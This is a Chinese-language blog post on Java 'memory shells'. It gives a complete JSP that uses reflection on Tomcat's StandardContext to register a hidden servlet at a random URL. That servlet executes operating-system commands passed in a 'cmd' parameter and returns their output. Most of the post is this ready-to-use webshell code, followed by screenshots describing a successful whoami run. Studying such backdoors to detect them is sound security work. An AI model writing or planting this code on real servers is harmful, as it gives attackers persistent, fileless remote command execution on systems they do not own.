+++
title = "servlet内存马"
date = 2026-06-15T19:21:40+08:00
draft = false
description = "Java 内存马 作为一种无文件落地的木马，研究很有必要"
tags = ["安全研究"]
categories = ["Java内存马"]
series = ["Java内存马基础系列"]
pin = false
cover = "/images/posts/java-security-cover-clean.svg"
+++

# 前置步骤

- 找到`StandardContext`  
- 继承并编写一个恶意`servlet`  
- 创建`Wapper`对象  
- 设置`Servlet`的`LoadOnStartUp`的值  
- 设置`Servlet`的`Name`  
- 设置`Servlet`对应的`Class`  
- 将`Servlet`添加到`context`的`children`中  
- 将`url`路径和`servlet`类做映射

666.jsp   代码

```jsp
<%@ page import="java.lang.reflect.Field" %>

<%@ page import="javax.servlet.Servlet" %>

<%@ page import="javax.servlet.ServletConfig" %>

<%@ page import="javax.servlet.ServletContext" %>

<%@ page import="javax.servlet.ServletRequest" %>

<%@ page import="javax.servlet.ServletResponse" %>

<%@ page import="java.io.IOException" %>

<%@ page import="java.io.InputStream" %>

<%@ page import="java.util.Scanner" %>

<%@ page import="java.io.PrintWriter" %>

<%@ page import="org.apache.catalina.core.StandardContext" %>

<%@ page import="org.apache.catalina.core.ApplicationContext" %>

<%@ page import="org.apache.catalina.Wrapper" %>

<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<html>

<head>

    <title>MemoryShellInjectDemo</title>

</head>

<body>

<%

    try {

        ServletContext servletContext = request.getSession().getServletContext();

        Field appctx = servletContext.getClass().getDeclaredField("context");

        appctx.setAccessible(true);

        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

        Field stdctx = applicationContext.getClass().getDeclaredField("context");

        stdctx.setAccessible(true);

        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

        String servletURL = "/" + getRandomString();

        String servletName = "Servlet" + getRandomString();

        Servlet servlet = new Servlet() {

            @Override

            public void init(ServletConfig servletConfig) {}

            @Override

            public ServletConfig getServletConfig() {

                return null;

            }

            @Override

            public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException {

                String cmd = servletRequest.getParameter("cmd");

                {

                    InputStream in = Runtime.getRuntime().exec("cmd /c " + cmd).getInputStream();

                    Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");

                    String output = s.hasNext() ? s.next() : "";

                    servletResponse.setCharacterEncoding("GBK");

                    PrintWriter out = servletResponse.getWriter();

                    out.println(output);

                    out.flush();

                    out.close();

                }

            }

            @Override

            public String getServletInfo() {

                return null;

            }

            @Override

            public void destroy() {

            }

        };

        Wrapper wrapper = standardContext.createWrapper();

        wrapper.setName(servletName);

        wrapper.setServlet(servlet);

        wrapper.setServletClass(servlet.getClass().getName());

        wrapper.setLoadOnStartup(1);

        standardContext.addChild(wrapper);

        standardContext.addServletMappingDecoded(servletURL, servletName);

        response.getWriter().write("[+] Success!!!<br><br>[*] ServletURL:&nbsp;&nbsp;&nbsp;&nbsp;" + servletURL + "<br><br>[*] ServletName:&nbsp;&nbsp;&nbsp;&nbsp;" + servletName + "<br><br>[*] shellURL:&nbsp;&nbsp;&nbsp;&nbsp;http://localhost:8080/servlet" + servletURL + "?cmd=echo 世界，你好！");

    } catch (Exception e) {

        String errorMessage = e.getMessage();

        response.setCharacterEncoding("UTF-8");

        PrintWriter outError = response.getWriter();

        outError.println("Error: " + errorMessage);

        outError.flush();

        outError.close();

    }

%>

</body>

</html>

<%!

    private String getRandomString() {

        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

        StringBuilder randomString = new StringBuilder();

        for (int i = 0; i < 8; i++) {

            int index = (int) (Math.random() * characters.length());

            randomString.append(characters.charAt(index));

        }

        return randomString.toString();

    }

%>
```

# 运行

可以看到  已经servlet已经动态注册路由了


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260518102321733.png)

尝试进行执行那个动态注册的路由   发现执行成功   

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260518102345128.png)

输入一个whoami命令进行试试  发现都已经可以了


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260518102432158.png)




